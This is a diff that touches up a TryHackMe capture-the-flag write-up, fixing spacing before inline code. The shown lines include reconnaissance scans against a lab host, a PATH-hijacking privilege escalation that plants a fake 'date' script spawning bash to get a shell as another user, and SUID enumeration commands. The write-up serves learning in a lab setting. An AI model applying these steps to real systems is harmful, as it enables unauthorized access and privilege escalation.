@@ -4,7 +4,7 @@ These notes are from a challenge I did @[tryhackme](https://tryhackme.com) calle
 
 ## First Checks
 
-Let's scan for open ports first:```nmap -sC -sV 10.10.28.31```
+Let's scan for open ports first: ```nmap -sC -sV 10.10.28.31```
 
 ??? output "Nmap output"
     ``` txt
@@ -25,7 +25,7 @@ Let's scan for open ports first:```nmap -sC -sV 10.10.28.31```
     Nmap done: 1 IP address (1 host up) scanned in 19.20 seconds
     ```
 
-Let's search for paths on the webpage on port 80:```gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.28.31:80```
+Let's search for paths on the webpage on port 80: ```gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.28.31:80```
 
 ??? output "Gobuster output"
     ``` txt
@@ -288,14 +288,14 @@ Let's copy `teaParty` to the kali machine and view it in detail with `strings te
     .comment
     ```
 
-We see the program calls `date` in this line:```/bin/echo -n 'Probably by ' && date --date='next hour' -R```. Just like with "random" from above, let's create our own `date` file e.g.:
+We see the program calls `date` in this line: ```/bin/echo -n 'Probably by ' && date --date='next hour' -R```. Just like with "random" from above, let's create our own `date` file e.g.:
 
 ``` sh
 #!/bin/sh
 bash
 ```
 
-Now, let's change the file to be executable by everyone:```chmod +x date``` and add it to the path variables:```PATH=/home/rabbit:$PATH```
+Now, let's change the file to be executable by everyone: ```chmod +x date``` and add it to the path variables: ```PATH=/home/rabbit:$PATH```
 
 If we now execute `./teaParty` we get a shell as hatter:
 
@@ -309,7 +309,7 @@ We can see the hatter password in `/home/hatter/password.txt`
 
 ## Login as hatter
 
-Since we have the user name and password, let' us login with ssh:```ssh hatter@10.10.28.31```
+Since we have the user name and password, let' us login with ssh: ```ssh hatter@10.10.28.31```
 
 `sudo -l`, `find / -perm -u=s -type f 2>/dev/null` and `find / -xdev -user hatter 2>/dev/null` don't reveal any interesting output but `find / -xdev -group hatter 2>/dev/null` shows group hatter owns perl. Unfortunately sudo is not possible and the suid bit isn’t set on the perl executable.
 
